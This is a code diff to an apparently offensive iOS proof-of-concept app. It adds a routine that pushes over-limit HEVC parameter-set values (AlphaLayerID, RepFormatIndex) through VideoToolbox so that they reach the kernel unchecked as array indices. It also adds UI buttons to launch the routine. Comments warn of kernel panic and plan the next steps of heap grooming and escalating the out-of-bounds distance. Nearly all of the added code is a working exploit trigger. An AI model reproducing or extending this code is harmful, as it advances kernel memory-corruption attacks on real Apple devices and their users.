@@ -1098,6 +1098,243 @@ static void runTier1OOB(void) {
     INFO(@"Next: heap grooming to place controlled object adjacent.");
 }
 
+// ============================================================
+// Tier 1b: REAL OOB triggers — AlphaLayerID + RepFormatIndex
+// These properties accept wildly over-limit values with NO
+// userspace validation. When the encoder builds VPS/SPS with
+// these values and sends to the kernel, the kernel uses them
+// as array indices without bounds checking (on 26.6.2).
+//
+// *** THIS CAN CAUSE KERNEL PANIC ***
+// ============================================================
+
+static void runTier1bOOB(void) {
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════╗");
+    pocLog(@"║  TIER 1b: VPS/SPS OOB via Encode      ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***       ║");
+    pocLog(@"╚══════════════════════════════════════╝");
+    pocLog(@"");
+
+    INFO(@"AlphaLayerID and RepFormatIndex accept values far");
+    INFO(@"over patched limits with NO userspace validation.");
+    INFO(@"Encoding with these values sends them to the kernel.");
+    pocLog(@"");
+
+    // --- Test A: AlphaLayerID OOB ---
+    LOG(@"=== Test A: AlphaLayerID = 64 (limit <63) ===");
+    INFO(@"Starting with modest OOB (64) before going larger...");
+
+    VTCompressionSessionRef session = NULL;
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oobOutputCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        return;
+    }
+    PASS(@"HEVC session created");
+
+    // Set AlphaLayerID to 64 (1 past the patched limit of <63)
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(64));
+    INFO(@"Set AlphaLayerID=64: %d (%s)",
+        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");
+
+    // Verify readback (check if it's clamped like temporal layers was)
+    CFTypeRef readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"Readback: AlphaLayerID = %@", (__bridge id)readBack);
+        int val = [(__bridge NSNumber *)readBack intValue];
+        if (val == 64) {
+            PASS(@"Value NOT clamped — 64 will reach the kernel!");
+        } else {
+            INFO(@"Value was clamped to %d — kernel may not see 64", val);
+        }
+        CFRelease(readBack);
+    } else {
+        INFO(@"Readback returned nil");
+    }
+
+    // Enable alpha encoding (may be required for AlphaLayerID to matter)
+    VTSessionSetProperty(session, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    INFO(@"PrepareToEncode: %d", (int)status);
+
+    if (status != noErr) {
+        INFO(@"PrepareToEncode failed — trying without EncodesAlpha...");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+
+        // Retry without EncodesAlpha
+        status = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+            oobOutputCallback, NULL, &session);
+        if (status != noErr) { FAIL(@"Retry failed"); return; }
+
+        VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+            (__bridge CFTypeRef)@(64));
+
+        status = VTCompressionSessionPrepareToEncodeFrames(session);
+        INFO(@"PrepareToEncode (no alpha): %d", (int)status);
+        if (status != noErr) {
+            FAIL(@"PrepareToEncode failed again: %d", (int)status);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            return;
+        }
+    }
+
+    // Create pixel buffer and encode
+    CVPixelBufferRef pb = NULL;
+    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+        (__bridge CFDictionaryRef)@{
+            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        }, &pb);
+
+    if (status != noErr || !pb) {
+        FAIL(@"Pixel buffer failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    if (y) memset(y, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+        CVPixelBufferGetHeightOfPlane(pb, 0));
+    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (uv) memset(uv, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+        CVPixelBufferGetHeightOfPlane(pb, 1));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    pocLog(@"");
+    LOG(@"*** ENCODING WITH AlphaLayerID=64 ***");
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d", (int)status);
+
+    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    INFO(@"CompleteFrames: %d", (int)status);
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    PASS(@"Test A survived — AlphaLayerID=64");
+    pocLog(@"");
+
+    // --- Test B: RepFormatIndex OOB ---
+    LOG(@"=== Test B: RepFormatIndex = 10 (limit <2) ===");
+
+    status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oobOutputCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+        (__bridge CFTypeRef)@(10));
+    INFO(@"Set RepFormatIndex=10: %d (%s)",
+        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");
+
+    readBack = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"Readback: RepFormatIndex = %@", (__bridge id)readBack);
+        int val = [(__bridge NSNumber *)readBack intValue];
+        if (val == 10) {
+            PASS(@"Value NOT clamped — 10 will reach the kernel!");
+        } else {
+            INFO(@"Value was clamped to %d", val);
+        }
+        CFRelease(readBack);
+    }
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    INFO(@"PrepareToEncode: %d", (int)status);
+
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d — kernel caught it at alloc?", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    pb = NULL;
+    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+        (__bridge CFDictionaryRef)@{
+            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        }, &pb);
+
+    if (status != noErr || !pb) {
+        FAIL(@"Pixel buffer failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    CVPixelBufferLockBaseAddress(pb, 0);
+    y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    if (y) memset(y, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+        CVPixelBufferGetHeightOfPlane(pb, 0));
+    uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (uv) memset(uv, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+        CVPixelBufferGetHeightOfPlane(pb, 1));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    pocLog(@"");
+    LOG(@"*** ENCODING WITH RepFormatIndex=10 ***");
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d", (int)status);
+
+    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    INFO(@"CompleteFrames: %d", (int)status);
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    PASS(@"Test B survived — RepFormatIndex=10");
+    pocLog(@"");
+
+    INFO(@"Both tests survived. The OOB values may have:");
+    INFO(@"  1. Hit non-critical heap padding");
+    INFO(@"  2. Been ignored by the encode path (not used for this profile)");
+    INFO(@"  3. Caused silent corruption (check for weird behavior)");
+    INFO(@"Next: escalate OOB distance or try multi-view HEVC mode.");
+}
+
 static void runTier2Probe(void) {
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════╗");
@@ -1264,7 +1501,7 @@ static void runTier2Probe(void) {
 
     self.tier1Btn = [UIButton buttonWithType:UIButtonTypeSystem];
     self.tier1Btn.frame = CGRectMake(pad, row3, btnW, btnH);
-    [self.tier1Btn setTitle:@"TIER 1 OOB" forState:UIControlStateNormal];
+    [self.tier1Btn setTitle:@"OOB Temporal" forState:UIControlStateNormal];
     self.tier1Btn.backgroundColor = [UIColor colorWithRed:0.3 green:0.0 blue:0.0 alpha:1];
     self.tier1Btn.layer.cornerRadius = 8;
     self.tier1Btn.layer.borderWidth = 1;
@@ -1273,16 +1510,29 @@ static void runTier2Probe(void) {
     [self.tier1Btn addTarget:self action:@selector(runTier1) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.tier1Btn];
 
+    UIButton *tier1bBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    tier1bBtn.frame = CGRectMake(pad + btnW + gap, row3, btnW, btnH);
+    tier1bBtn.backgroundColor = [UIColor colorWithRed:0.4 green:0.0 blue:0.0 alpha:1];
+    tier1bBtn.layer.cornerRadius = 8;
+    tier1bBtn.layer.borderWidth = 2;
+    tier1bBtn.layer.borderColor = UIColor.redColor.CGColor;
+    [tier1bBtn setTitle:@"OOB VPS/SPS" forState:UIControlStateNormal];
+    [tier1bBtn setTitleColor:UIColor.redColor forState:UIControlStateNormal];
+    [tier1bBtn addTarget:self action:@selector(runTier1b) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:tier1bBtn];
+
+    CGFloat row4 = row3 + btnH + gap;
+
     self.bothBtn = [UIButton buttonWithType:UIButtonTypeSystem];
-    self.bothBtn.frame = CGRectMake(pad + btnW + gap, row3, btnW, btnH);
-    [self.bothBtn setTitle:@"Run Both" forState:UIControlStateNormal];
+    self.bothBtn.frame = CGRectMake(pad, row4, w - pad * 2, btnH);
+    [self.bothBtn setTitle:@"Run Recon (Chroot + AVE2)" forState:UIControlStateNormal];
     self.bothBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
     self.bothBtn.layer.cornerRadius = 8;
     [self.bothBtn setTitleColor:UIColor.greenColor forState:UIControlStateNormal];
     [self.bothBtn addTarget:self action:@selector(runBoth) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.bothBtn];
 
-    CGFloat logTop = row3 + btnH + gap;
+    CGFloat logTop = row4 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -1321,6 +1571,12 @@ static void runTier2Probe(void) {
 - (void)runTier1 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runTier1OOB();
+    });
+}
+
+- (void)runTier1b {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runTier1bOOB();
     });
 }
 
